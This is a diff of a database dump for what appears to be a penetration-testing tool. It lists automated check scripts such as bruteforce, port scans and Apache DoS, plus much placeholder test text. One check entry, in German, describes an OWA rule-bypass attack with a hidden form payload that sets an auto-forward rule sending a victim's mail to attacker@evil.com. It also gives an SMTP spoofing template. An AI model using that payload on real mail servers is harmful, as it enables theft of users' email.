 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1543,7 +1715,7 @@ ALTER TABLE ONLY risk_templates ALTER COLUMN id SET DEFAULT nextval('risk_templa
 
 
 --
--- TOC entry 2050 (class 2604 OID 21812)
+-- TOC entry 2047 (class 2604 OID 21812)
 -- Dependencies: 171 170
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1552,7 +1724,7 @@ ALTER TABLE ONLY system ALTER COLUMN id SET DEFAULT nextval('system_id_seq'::reg
 
 
 --
--- TOC entry 2059 (class 2604 OID 21813)
+-- TOC entry 2056 (class 2604 OID 21813)
 -- Dependencies: 179 178
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1561,7 +1733,7 @@ ALTER TABLE ONLY targets ALTER COLUMN id SET DEFAULT nextval('targets_id_seq'::r
 
 
 --
--- TOC entry 2061 (class 2604 OID 21814)
+-- TOC entry 2058 (class 2604 OID 21814)
 -- Dependencies: 181 180
 -- Name: id; Type: DEFAULT; Schema: public; Owner: gtta
 --
@@ -1570,7 +1742,991 @@ ALTER TABLE ONLY users ALTER COLUMN id SET DEFAULT nextval('users_id_seq'::regcl
 
 
 --
--- TOC entry 2080 (class 2606 OID 21816)
+-- TOC entry 2231 (class 0 OID 21605)
+-- Dependencies: 140
+-- Data for Name: check_categories; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY check_categories (id, name) FROM stdin;
+2	FTP
+3	SMTP
+4	SSH
+5	TCP
+6	Web Anonymous
+1	DNS
+8	Eine Kleine
+10	zed
+9	AUTHENTICATED WEB CHECKS
+11	New & Modified Checks
+\.
+
+
+--
+-- TOC entry 2232 (class 0 OID 21613)
+-- Dependencies: 142
+-- Data for Name: check_categories_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY check_categories_l10n (check_category_id, language_id, name) FROM stdin;
+2	1	FTP
+2	2	\N
+3	1	SMTP
+3	2	\N
+4	1	SSH
+4	2	\N
+5	1	TCP
+5	2	\N
+6	1	Web Anonymous
+6	2	\N
+1	1	DNS
+1	2	\N
+8	1	\N
+8	2	Eine Kleine
+10	1	zed
+10	2	\N
+9	1	AUTHENTICATED WEB CHECKS
+9	2	Piuyyy
+11	1	New & Modified Checks
+11	2	\N
+\.
+
+
+--
+-- TOC entry 2233 (class 0 OID 21619)
+-- Dependencies: 143
+-- Data for Name: check_controls; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY check_controls (id, check_category_id, name, sort_order) FROM stdin;
+2	2	Default	2
+3	3	Default	3
+4	4	Default	4
+5	5	Default	5
+6	6	Default	6
+10	9	SESSION HANDLING & COOKIES	10
+12	11	New checks	12
+14	1	2	14
+15	1	3	15
+16	1	4	16
+17	1	5	17
+11	1	Empty Control	9
+13	1	1	11
+8	1	Session Handling	13
+1	1	Default	1
+7	1	This is a long name of the control	7
+9	1	Some other important stuff	8
+\.
+
+
+--
+-- TOC entry 2234 (class 0 OID 21627)
+-- Dependencies: 145
+-- Data for Name: check_controls_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY check_controls_l10n (check_control_id, language_id, name) FROM stdin;
+2	1	Default
+2	2	\N
+3	1	Default
+3	2	\N
+4	1	Default
+4	2	\N
+5	1	Default
+5	2	\N
+6	1	Default
+6	2	\N
+7	1	This is a long name of the control
+7	2	\N
+9	1	Some other important stuff
+9	2	\N
+11	1	Empty Control
+11	2	\N
+8	1	Session Handling
+8	2	\N
+10	1	SESSION HANDLING & COOKIES
+10	2	\N
+1	1	Default
+1	2	zzz
+12	1	New checks
+12	2	\N
+13	1	1
+13	2	\N
+14	1	2
+14	2	\N
+15	1	3
+15	2	\N
+16	1	4
+16	2	\N
+17	1	5
+17	2	\N
+\.
+
+
+--
+-- TOC entry 2235 (class 0 OID 21633)
+-- Dependencies: 146
+-- Data for Name: check_inputs; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY check_inputs (id, check_id, name, description, sort_order, value, type) FROM stdin;
+5	5	Timeout		0	120	0
+6	5	Debug		1	1	0
+7	6	Show All		0	0	0
+8	8	Timeout		0	10	0
+9	8	Max Results		1	100	0
+10	8	Mode	Operation mode: 0 - output generated list only, 1 - resolve IP check	2	1	0
+11	12	Hostname		0		0
+12	13	Hostname		0		0
+13	15	Long List		0	0	0
+14	16	Long List		0	0	0
+15	17	Users		0		0
+16	17	Passwords		1		0
+17	20	Recipient		0		0
+18	20	Server		1		0
+19	20	Login		2		0
+20	20	Password		3		0
+21	20	Sender		4		0
+22	20	Folder		5		0
+23	21	Timeout		0	10	0
+24	21	Source E-mail		1	source@gmail.com	0
+25	21	Destination E-mail		2	destination@gmail.com	0
+26	22	Users		0		0
+27	22	Passwords		1		0
+28	23	Port Range	Port range that will be passed to nmap. Please use nmap syntax for -p command line argument (for example, 22; 1-65535; U:53,111,137,T:21-25,80,139,8080)	0		0
+29	23	Timeout	Timeout in milliseconds.	1	1000	0
+30	24	Port Range	2 lines: start and end of the range.	0	1\r\n80	0
+31	26	Range Count		0	10	0
+32	32	Code	Possible values: php, cfm, asp.	0	php	0
+34	35	Paths		0		0
+33	34	URLs		0		0
+35	36	Paths		0		0
+36	37	Paths		0		0
+37	42	Timeout		0	10	0
+38	43	Page Type	Possible values: php, asp.	0	php	0
+39	43	Cookies		1		0
+40	43	URL Limit		2	100	0
+42	45	Hostname		0		0
+1	1	Hostname		0	asdfasdf	0
+45	1	Here Goes Select	Multiple Values	3	kinda\r\nmultiple\r\nvalues\r\nto\r\nselect	0
+44	1	Checkbox	Is good enough	2	hellooo	0
+43	1	Text Field		1	Some Default Value	0
+46	41	Admin Logins		0		4
+47	41	Adobe xml		1		4
+\.
+
+
+--
+-- TOC entry 2236 (class 0 OID 21642)
+-- Dependencies: 148
+-- Data for Name: check_inputs_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY check_inputs_l10n (check_input_id, language_id, name, description) FROM stdin;
+5	1	Timeout	\N
+5	2	\N	\N
+6	1	Debug	\N
+6	2	\N	\N
+7	1	Show All	\N
+7	2	\N	\N
+8	1	Timeout	\N
+8	2	\N	\N
+9	1	Max Results	\N
+9	2	\N	\N
+10	1	Mode	Operation mode: 0 - output generated list only, 1 - resolve IP check
+10	2	\N	\N
+11	1	Hostname	\N
+11	2	\N	\N
+12	1	Hostname	\N
+12	2	\N	\N
+13	1	Long List	\N
+13	2	\N	\N
+14	1	Long List	\N
+14	2	\N	\N
+15	1	Users	\N
+15	2	\N	\N
+16	1	Passwords	\N
+16	2	\N	\N
+17	1	Recipient	\N
+17	2	\N	\N
+18	1	Server	\N
+18	2	\N	\N
+19	1	Login	\N
+19	2	\N	\N
+20	1	Password	\N
+20	2	\N	\N
+21	1	Sender	\N
+21	2	\N	\N
+22	1	Folder	\N
+22	2	\N	\N
+23	1	Timeout	\N
+23	2	\N	\N
+24	1	Source E-mail	\N
+24	2	\N	\N
+25	1	Destination E-mail	\N
+25	2	\N	\N
+26	1	Users	\N
+26	2	\N	\N
+27	1	Passwords	\N
+27	2	\N	\N
+28	1	Port Range	Port range that will be passed to nmap. Please use nmap syntax for -p command line argument (for example, 22; 1-65535; U:53,111,137,T:21-25,80,139,8080)
+28	2	\N	\N
+29	1	Timeout	Timeout in milliseconds.
+29	2	\N	\N
+30	1	Port Range	2 lines: start and end of the range.
+30	2	\N	\N
+31	1	Range Count	\N
+31	2	\N	\N
+32	1	Code	Possible values: php, cfm, asp.
+32	2	\N	\N
+34	1	Paths	\N
+34	2	\N	\N
+33	1	URLs	\N
+33	2	\N	\N
+35	1	Paths	\N
+35	2	\N	\N
+36	1	Paths	\N
+36	2	\N	\N
+37	1	Timeout	\N
+37	2	\N	\N
+38	1	Page Type	Possible values: php, asp.
+38	2	\N	\N
+39	1	Cookie	\N
+39	2	\N	\N
+40	1	URL Limit	\N
+40	2	\N	\N
+42	1	Hostname	\N
+42	2	\N	\N
+1	1	Hostname	\N
+1	2	\N	\N
+45	1	Here Goes Select	Multiple Values
+45	2	\N	\N
+44	1	Checkbox	Is good enough
+44	2	\N	\N
+43	1	Text Field	\N
+43	2	\N	\N
+46	1	Admin Logins	\N
+46	2	\N	\N
+47	1	Adobe xml	\N
+47	2	\N	\N
+\.
+
+
+--
+-- TOC entry 2237 (class 0 OID 21648)
+-- Dependencies: 149
+-- Data for Name: check_results; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY check_results (id, check_id, result, sort_order, title) FROM stdin;
+3	3	Resulten	1	Test Deutsche
+2	3	Here is no formatting at all - because this field is plain text. Please humble with that.\r\n\r\nLine span.	0	Test English
+5	46	zzz & xxx <a> lolo	0	xxx
+\.
+
+
+--
+-- TOC entry 2238 (class 0 OID 21657)
+-- Dependencies: 151
+-- Data for Name: check_results_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY check_results_l10n (check_result_id, language_id, result, title) FROM stdin;
+3	1	\N	\N
+3	2	Resulten	Test Deutsche
+2	1	Here is no formatting at all - because this field is plain text. Please humble with that.\r\n\r\nLine span.	Test English
+2	2	Result ' Pizda Dzhigurda (de)	Zuzuz
+5	1	zzz & xxx <a> lolo	xxx
+5	2	\N	\N
+\.
+
+
+--
+-- TOC entry 2239 (class 0 OID 21663)
+-- Dependencies: 152
+-- Data for Name: check_solutions; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY check_solutions (id, check_id, solution, sort_order, title) FROM stdin;
+5	3	i love you too	1	tears of prophecy
+4	3	<i>zoo</i><br><i>gooooo<br><br></i>pom pom<br><i><br></i><b>black</b>	0	aduljadei
+7	46	zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz<br><br><ol><li>asdfsadf</li><li>asdfasdf</li></ol><br>sdfsadf<br><ul><li>dsf</li><li>asdfasdf</li></ul><br>	0	Fuck something
+\.
+
+
+--
+-- TOC entry 2240 (class 0 OID 21672)
+-- Dependencies: 154
+-- Data for Name: check_solutions_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY check_solutions_l10n (check_solution_id, language_id, solution, title) FROM stdin;
+5	1	i love you too	tears of prophecy
+5	2	ich liebe dir	\N
+4	1	<i>zoo</i><br><i>gooooo<br><br></i>pom pom<br><i><br></i><b>black</b>	aduljadei
+4	2	\N	\N
+7	1	zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz<br><br><ol><li>asdfsadf</li><li>asdfasdf</li></ol><br>sdfsadf<br><ul><li>dsf</li><li>asdfasdf</li></ul><br>	Fuck something
+7	2	\N	\N
+\.
+
+
+--
+-- TOC entry 2241 (class 0 OID 21678)
+-- Dependencies: 155
+-- Data for Name: checks; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY checks (id, check_control_id, name, background_info, hints, advanced, automated, script, multiple_solutions, protocol, port, question, reference_id, reference_code, reference_url, effort, sort_order) FROM stdin;
+17	2	FTP Bruteforce			f	t	ftp_bruteforce.pl	f		\N		1			2	17
+18	3	SMTP Banner			f	t	smtp_banner.py	f		\N		1			2	18
+19	3	SMTP DNSBL			f	t	smtp_dnsbl.py	f		\N		1			2	19
+20	3	SMTP Filter			f	t	smtp_filter.py	f		\N		1			2	20
+21	3	SMTP Relay			f	t	smtp_relay.pl	f		\N		1			2	21
+13	1	DNS SPF			f	t	dns_spf.py	f		\N		1			2	16
+12	1	DNS SOA			f	t	dns_soa.py	f		\N		1			2	15
+10	1	DNS NS Version			f	t	ns_version.pl	f		\N		1			2	13
+16	1	DNS Top TLDs			f	t	dns_top_tlds.pl	f		\N		1			2	45
+15	1	DNS Subdomain Bruteforce			f	t	subdomain_bruteforce.pl	f		\N		1			2	3
+9	1	DNS NIC Whois			f	t	nic_whois.pl	f		\N		1			2	12
+7	1	DNS IP Range			f	t	dns_ip_range.pl	f		\N		1			2	10
+22	4	SSH Bruteforce			f	t	ssh_bruteforce.pl	f		\N		1			2	22
+23	5	Nmap Port Scan			f	t	pscan.pl	f		\N		1			2	23
+24	5	TCP Port Scan			f	t	portscan.pl	f		\N		1			2	24
+25	5	TCP Traceroute			f	t	tcp_traceroute.py	f		80		1			2	25
+26	6	Apache DoS			f	t	apache_dos.pl	f		\N		1			2	26
+27	6	Fuzz Check			f	t	fuzz_check.pl	f		\N		1			2	27
+28	6	Google URL			f	t	google_url.pl	f		\N		1			2	28
+29	6	Grep URL			f	t	grep_url.pl	f	http	\N		1			2	29
+30	6	HTTP Banner			f	t	http_banner.pl	f	http	\N		1			2	30
+31	6	Joomla Scan			f	t	joomla_scan.pl	f	http	\N		1			2	31
+32	6	Login Pages			f	t	login_pages.pl	f	http	\N		1			2	32
+33	6	Nikto			f	t	nikto.pl	f	http	80		1			2	33
+34	6	URL Scan			f	t	urlscan.pl	f	http	\N		1			2	34
+35	6	Web Auth Scanner			f	t	www_auth_scanner.pl	f	http	80		1			2	35
+36	6	Web Directory Scanner			f	t	www_dir_scanner.pl	f	http	80		1			2	36
+37	6	Web File Scanner			f	t	www_file_scanner.pl	f	http	80		1			2	37
+38	6	Web HTTP Methods			f	t	web_http_methods.py	f		\N		1			2	38
+39	6	Web Server CMS			f	t	webserver_cms.pl	f		\N		1			2	39
+40	6	Web Server Error Message			f	t	webserver_error_msg.pl	f		\N		1			2	40
+41	6	Web Server Files			f	t	webserver_files.pl	f		\N		1			2	41
+42	6	Web Server SSL			f	t	webserver_ssl.pl	f		\N		1			2	42
+43	6	Web SQL XSS			f	t	web_sql_xss.py	f		\N		1			2	43
+5	7	DNS Find NS			f	t	dns_find_ns.pl	f		\N		1			2	5
+8	8	DNS NIC Typosquatting			f	t	nic_typosquatting.pl	f		\N		1			2	8
+11	8	DNS Resolve IP			f	t	dns_resolve_ip.pl	f		\N		1			2	11
+14	9	DNS SPF (Perl)			f	t	dns_spf.pl	f		\N		1			2	14
+47	12	CMS check			f	t	cms_detection.py	f	http	80		1			2	47
+48	10	yay			f	f		f		\N		1			2	48
+49	13	hh			f	f		f		\N		1			2	49
+46	10	Scan Somethingh	<u></u>{&nbsp;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,\r\nbullet point&nbsp;</span><br>{\\fuck} {fuck} {shit}<br><ul><li>uno</li><li>dos</li><li>tres</li></ul><ol><li>eins</li><li>zwei</li><li>drei</li><li>whatever</li></ol>Unter&nbsp;<a target="_blank" rel="nofollow" href="http://packetstormsecurity.org/files/view/85931/owa-bypass.txt">http://packetstormsecurity.org/files/view/85931/owa-bypass.txt</a>&nbsp;&nbsp;ist eine Schwachstelle <u>beschrieben</u>, wie man OWA Regeln umgehen kann.<br>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,&nbsp;</span><br>Dazu muss man eine Webseite einrichten, die der Benutzer besuchen muss.<span>Der nachfolgende Code muss auf einer Webseite sein, die ein angemeldeter OWA Benutzer besucht<br><br></span>Die Webseite muss dabei einen POST request durchführen, um eine Auto-Forward Regel einzurichten: &nbsp;<br><br>POST&nbsp;<span><a target="_blank" rel="nofollow" href="https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save">https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save</a>&gt;&nbsp;</span><br><br>&lt;input type="hidden"&nbsp;<br><br><span>name='&amp;#60params&amp;#62&amp;#60Id&amp;#62&amp;#60/Id&amp;#62&amp;#60Name&amp;#62Test&amp;#60/Name&amp;#62&amp;#60RecpA4&amp;#62&amp;#60item&amp;#62&amp;#60Rcp DN="attacker@evil.com" EM="attacker@evil.com" RT="SMTP" AO="3"&amp;#62&amp;#60/Rcp&amp;#62&amp;#60/item&amp;#62&amp;#60/RecpA4&amp;#62&amp;#60Actions&amp;#62&amp;#60item&amp;#62&amp;#60rca t="4"&amp;#62&amp;#60/rca&amp;#62&amp;#60/item&amp;#62&amp;#60/Actions&amp;#62&amp;#60/params&amp;#62' value=""&gt; &lt;/form&gt;<br></span>zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz<br>	<span>HELO MYDOMAIN<br></span><ol><li>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;</li><li>RCPT TO :&lt;InternalName2@domain.ch&gt;</li></ol><span>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br></span><ul><li>\r\nFROM: InternalName1</li><li>TO: InternalName2</li></ul><span><span>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br></span></span><ul><li>\r\nInfoguard AG</li></ul>	f	t	w3af_get_mails.py	t		\N	<span>HELO MYDOMAIN<br></span><ul><li>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;</li><li>RCPT TO :&lt;InternalName2@domain.ch&gt;</li></ul><span>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br>\r\n<br></span><ol><li>\r\nFROM: InternalName1</li><li>TO: InternalName2</li></ol><span><span>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br>\r\nInfoguard AG</span></span>	1			2	46
+3	1	DNS AFXR	hey <b>fuck \\' sss</b><br><b>How are you?<br></b>sd<br><b></b>1. this is some kind of list<br>2. lololo upup up<br>sdfa<br>asdf<br>asdf<br>sdd<br>sdf<br>sdf	jjj<br>what the fuck did you do?	f	t	dns_afxr.pl	f		\N	No more no more	1			2	6
+45	1	DNS A (Non-Recursive)			f	t	dns_a_nr.py	f		\N		1			2	1
+6	1	DNS Hosting	hello		f	t	dns_hosting.py	f		\N		1			2	9
+1	1	DNS A	blabla <a target="_blank" rel="nofollow" href="http://google.com">google.com</a><br><br>some shit<br><br>\r\n\r\n<a target="_blank" rel="nofollow" href="http://google.com">yay</a>.		f	t	dns_a.py	f		\N		1			2	7
+\.
+
+
+--
+-- TOC entry 2242 (class 0 OID 21687)
+-- Dependencies: 157
+-- Data for Name: checks_l10n; Type: TABLE DATA; Schema: public; Owner: gtta
+--
+
+COPY checks_l10n (check_id, language_id, name, background_info, hints, reference, question) FROM stdin;
+7	1	DNS IP Range	\N	\N	\N	\N
+7	2	\N	\N	\N	\N	\N
+9	1	DNS NIC Whois	\N	\N	\N	\N
+9	2	\N	\N	\N	\N	\N
+10	1	DNS NS Version	\N	\N	\N	\N
+10	2	\N	\N	\N	\N	\N
+12	1	DNS SOA	\N	\N	\N	\N
+12	2	\N	\N	\N	\N	\N
+13	1	DNS SPF	\N	\N	\N	\N
+13	2	\N	\N	\N	\N	\N
+15	1	DNS Subdomain Bruteforce	\N	\N	\N	\N
+15	2	\N	\N	\N	\N	\N
+16	1	DNS Top TLDs	\N	\N	\N	\N
+16	2	\N	\N	\N	\N	\N
+17	1	FTP Bruteforce	\N	\N	\N	\N
+17	2	\N	\N	\N	\N	\N
+18	1	SMTP Banner	\N	\N	\N	\N
+18	2	\N	\N	\N	\N	\N
+19	1	SMTP DNSBL	\N	\N	\N	\N
+19	2	\N	\N	\N	\N	\N
+20	1	SMTP Filter	\N	\N	\N	\N
+20	2	\N	\N	\N	\N	\N
+21	1	SMTP Relay	\N	\N	\N	\N
+21	2	\N	\N	\N	\N	\N
+22	1	SSH Bruteforce	\N	\N	\N	\N
+22	2	\N	\N	\N	\N	\N
+23	1	Nmap Port Scan	\N	\N	\N	\N
+23	2	\N	\N	\N	\N	\N
+24	1	TCP Port Scan	\N	\N	\N	\N
+24	2	\N	\N	\N	\N	\N
+25	1	TCP Traceroute	\N	\N	\N	\N
+25	2	\N	\N	\N	\N	\N
+26	1	Apache DoS	\N	\N	\N	\N
+26	2	\N	\N	\N	\N	\N
+27	1	Fuzz Check	\N	\N	\N	\N
+27	2	\N	\N	\N	\N	\N
+28	1	Google URL	\N	\N	\N	\N
+28	2	\N	\N	\N	\N	\N
+29	1	Grep URL	\N	\N	\N	\N
+29	2	\N	\N	\N	\N	\N
+30	1	HTTP Banner	\N	\N	\N	\N
+30	2	\N	\N	\N	\N	\N
+31	1	Joomla Scan	\N	\N	\N	\N
+31	2	\N	\N	\N	\N	\N
+32	1	Login Pages	\N	\N	\N	\N
+32	2	\N	\N	\N	\N	\N
+33	1	Nikto	\N	\N	\N	\N
+33	2	\N	\N	\N	\N	\N
+34	1	URL Scan	\N	\N	\N	\N
+34	2	\N	\N	\N	\N	\N
+35	1	Web Auth Scanner	\N	\N	\N	\N
+35	2	\N	\N	\N	\N	\N
+36	1	Web Directory Scanner	\N	\N	\N	\N
+36	2	\N	\N	\N	\N	\N
+37	1	Web File Scanner	\N	\N	\N	\N
+37	2	\N	\N	\N	\N	\N
+38	1	Web HTTP Methods	\N	\N	\N	\N
+38	2	\N	\N	\N	\N	\N
+39	1	Web Server CMS	\N	\N	\N	\N
+39	2	\N	\N	\N	\N	\N
+40	1	Web Server Error Message	\N	\N	\N	\N
+40	2	\N	\N	\N	\N	\N
+41	1	Web Server Files	\N	\N	\N	\N
+41	2	\N	\N	\N	\N	\N
+42	1	Web Server SSL	\N	\N	\N	\N
+42	2	\N	\N	\N	\N	\N
+43	1	Web SQL XSS	\N	\N	\N	\N
+43	2	\N	\N	\N	\N	\N
+5	1	DNS Find NS	\N	\N	\N	\N
+5	2	\N	\N	\N	\N	\N
+8	1	DNS NIC Typosquatting	\N	\N	\N	\N
+8	2	\N	\N	\N	\N	\N
+11	1	DNS Resolve IP	\N	\N	\N	\N
+11	2	\N	\N	\N	\N	\N
+14	1	DNS SPF (Perl)	\N	\N	\N	\N
+14	2	\N	\N	\N	\N	\N
+45	1	DNS A (Non-Recursive)	\N	\N	\N	\N
+45	2	\N	\N	\N	\N	\N
+6	1	DNS Hosting	hello	\N	\N	\N
+6	2	\N	\N	\N	\N	\N
+3	1	DNS AFXR	hey <b>fuck \\' sss</b><br><b>How are you?<br></b>sd<br><b></b>1. this is some kind of list<br>2. lololo upup up<br>sdfa<br>asdf<br>asdf<br>sdd<br>sdf<br>sdf	jjj<br>what the fuck did you do?	\N	No more no more
+3	2	ZXZXZXX	meowsfvfd<br>sdfsdf<br>sdf<br>sdf<br>sd<br>f<br>sdf<br>sd<br>f<br>sd<br>f<br>sdf	piu<i> poiu</i>	\N	\N
+1	1	DNS A	blabla <a target="_blank" rel="nofollow" href="http://google.com">google.com</a><br><br>some shit<br><br>\r\n\r\n<a target="_blank" rel="nofollow" href="http://google.com">yay</a>.	\N	\N	\N
+1	2	ZZZ	blabla <a target="_blank" rel="nofollow" href="http://google.com">google.com</a><br><br>some shit<br><br>\r\n\r\n<a target="_blank" rel="nofollow" href="http://google.com">yay</a>.	\N	\N	\N
+46	2	\N	\N	\N	\N	\N
+47	1	CMS check	\N	\N	\N	\N
+47	2	\N	\N	\N	\N	\N
+48	1	yay	\N	\N	\N	\N
+48	2	\N	\N	\N	\N	\N
+49	1	hh	\N	\N	\N	\N
+49	2	\N	\N	\N	\N	\N
+46	1	Scan Somethingh	<u></u>{&nbsp;\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,\r\nbullet point&nbsp;</span><br>{\\fuck} {fuck} {shit}<br><ul><li>uno</li><li>dos</li><li>tres</li></ul><ol><li>eins</li><li>zwei</li><li>drei</li><li>whatever</li></ol>Unter&nbsp;<a target="_blank" rel="nofollow" href="http://packetstormsecurity.org/files/view/85931/owa-bypass.txt">http://packetstormsecurity.org/files/view/85931/owa-bypass.txt</a>&nbsp;&nbsp;ist eine Schwachstelle <u>beschrieben</u>, wie man OWA Regeln umgehen kann.<br>\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n<span>as well <u>underline</u>,&nbsp;</span><br>Dazu muss man eine Webseite einrichten, die der Benutzer besuchen muss.<span>Der nachfolgende Code muss auf einer Webseite sein, die ein angemeldeter OWA Benutzer besucht<br><br></span>Die Webseite muss dabei einen POST request durchführen, um eine Auto-Forward Regel einzurichten: &nbsp;<br><br>POST&nbsp;<span><a target="_blank" rel="nofollow" href="https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save">https://webmail.mycorporation.com/owa/ev.owa?oeh=1&amp;ns=Rule&amp;ev=Save</a>&gt;&nbsp;</span><br><br>&lt;input type="hidden"&nbsp;<br><br><span>name='&amp;#60params&amp;#62&amp;#60Id&amp;#62&amp;#60/Id&amp;#62&amp;#60Name&amp;#62Test&amp;#60/Name&amp;#62&amp;#60RecpA4&amp;#62&amp;#60item&amp;#62&amp;#60Rcp DN="attacker@evil.com" EM="attacker@evil.com" RT="SMTP" AO="3"&amp;#62&amp;#60/Rcp&amp;#62&amp;#60/item&amp;#62&amp;#60/RecpA4&amp;#62&amp;#60Actions&amp;#62&amp;#60item&amp;#62&amp;#60rca t="4"&amp;#62&amp;#60/rca&amp;#62&amp;#60/item&amp;#62&amp;#60/Actions&amp;#62&amp;#60/params&amp;#62' value=""&gt; &lt;/form&gt;<br></span>zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz<br>	<span>HELO MYDOMAIN<br></span><ol><li>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;</li><li>RCPT TO :&lt;InternalName2@domain.ch&gt;</li></ol><span>\r\nREPLY-TO:&lt;infoguard@netprotect.ch)<br>\r\nData<br></span><ul><li>\r\nFROM: InternalName1</li><li>TO: InternalName2</li></ul><span><span>\r\nSubject: Infoguard Test <br>\r\n<br>\r\nGruezi!<br>\r\n<br>\r\n</span><span>Dies ist ein Mail Spoofing Check von Infoguard. Wir\r\nversuchen dabei von extern auf dem Mailserver des Kunden zu verbinden und im\r\nNamen eines existierenden internen Mitarbeiters A eine Mail an einen internen\r\nMitarbeiter B zu senden. Bitte um kurze Rueckbestaetigung, falls diese Mail\r\nangekommen ist (infoguard@netprotect.ch). <br>\r\n<br>\r\n</span><span>Gruss<br></span></span><ul><li>\r\nInfoguard AG</li></ul>	\N	<span>HELO MYDOMAIN<br></span><ul><li>\r\nMAIL FROM:&lt;InternalName1@domain.ch&gt;</li><li>RCPT TO 